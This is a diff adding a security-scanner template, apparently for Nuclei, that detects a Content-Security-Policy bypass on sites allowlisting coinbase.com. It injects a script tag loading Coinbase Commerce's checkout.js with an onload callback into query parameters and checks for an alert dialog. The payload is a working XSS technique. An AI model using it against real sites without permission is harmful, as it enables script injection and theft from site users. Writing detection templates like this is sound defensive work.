@@ -1,0 +1,55 @@
+id: coinbase-commerce-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Coinbase Commerce
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,coinbase-commerce
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "coinbase.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: coinbase_commerce_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://commerce.coinbase.com/v1/checkout.js?onload=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "coinbase_commerce_csp_xss == true"
+# digest: 490a0046304402203185589105b2f3246bb50b43bfb22318846e3dc24a4ce9e8153ad6a13b01909802203211df62a2a0031d6ed2ebba5b109e800468c5c76bc13865dd25baf6ac5a03b0:922c64590222798bb761d5b6d8e72950
